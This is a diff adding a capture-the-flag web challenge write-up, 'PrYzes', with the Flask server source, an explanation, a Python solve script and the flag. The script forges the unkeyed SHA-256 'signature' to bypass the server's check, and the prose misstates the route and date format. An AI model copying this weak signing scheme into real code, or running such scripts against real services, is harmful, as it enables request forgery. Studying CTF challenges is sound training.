@@ -15,6 +15,7 @@
   - Moo
   - Free Shell
 - Web:
+  - PrYzes
 
 -------------------
 
@@ -117,6 +118,100 @@ subprocess.run(command)
 
 ![image](https://github.com/user-attachments/assets/41d0458b-3371-4d73-a77e-4a8ebc28602f)
 
+-----------------
+
+### WEB:
+-----------------
+
+### PrYzes:
+
+![image](https://github.com/user-attachments/assets/13773d59-ab69-4019-9eb3-4e710231eaf3)
+
+### Source code:
+
+```python3
+from flask import Flask, render_template, request, jsonify
+
+import hashlib
+import json
+from os import getenv
+from datetime import datetime
+
+
+app = Flask(__name__)
+FLAG = getenv("FLAG", "Hero{FAKE_FLAG}")
+
+def compute_sha256(data):
+    sha256_hash = hashlib.sha256()
+    sha256_hash.update(data.encode("utf-8"))
+    return sha256_hash.hexdigest()
+
+@app.route("/", methods=["GET"])
+def index():
+    return render_template("index.html")
+
+@app.route("/api/prizes", methods=["POST"])
+def claim_prizes():
+    data = request.json
+    date_str = data.get("date")
+    received_signature = request.headers.get("X-Signature")
+
+    json_data = json.dumps(data)
+    expected_signature = compute_sha256(json_data)
+
+    if not received_signature == expected_signature:
+        return jsonify({"error": "Invalid signature"}), 400
+    
+    if not date_str:
+        return jsonify({"error": "Date is missing"}), 400
+
+    try:
+        date_obj = datetime.strptime(date_str, "%d/%m/%Y")
+        if date_obj.year >= 2100:
+            return jsonify({"message": FLAG}), 200
+
+        return jsonify({"error": "Please come back later..."}), 400
+    except ValueError:
+        return jsonify({"error": "Invalid date format"}), 400
+```
+
+- The main route to query is `/api/routes` which takes in json data. The key `date` and header `X-SIgnature` is grabbed.In order to get the flag, the date value will passed to `datetime.strptime` function with format `%d/%m/%y` and the year is grabbed.The value of the year must the more than `2100`.Another consideration is that the json data must hashed with `sha256` and passed to the `X-Signature` header.To get the flag,our json data must be equal to our hash which is the signature.
+
+- I wrote a script to solve the challenge.
+
+```python3
+#! /usr/bin/env python3
+from ten import *
+from tenlib.transform import *
+
+@entry
+@arg("host","target host")
+class Exploit:
+    def __init__(self,host: str):
+        self.host = host
+    #Hash the data with sha256
+    @staticmethod
+    def compute_sha256(data):
+        hash = hashing.sha256(data)
+        return hash
+    def run(self):
+        session = ScopedSession(self.host)
+        #A year more than or equal to 2100
+        date: str =  "6/10/2100"
+        data = {"date":date}
+        headers =  {"Content-Type":"application/json","X-Signature":Exploit.compute_sha256(json.encode(data))}
+        response =  session.post("/api/prizes",headers=headers,data=json.encode(data)).text
+        print(json.decode(response)["message"])
+
+if __name__ == "__main__":
+    Exploit()
+```
+
+- Script's output
+
+![image](https://github.com/user-attachments/assets/5808b9e4-42a1-48f5-a644-6094edcceaca)
+
+- Flag-:```Hero{PrYzes_4r3_4m4z1ng!!!9371497139}```
 
 
 
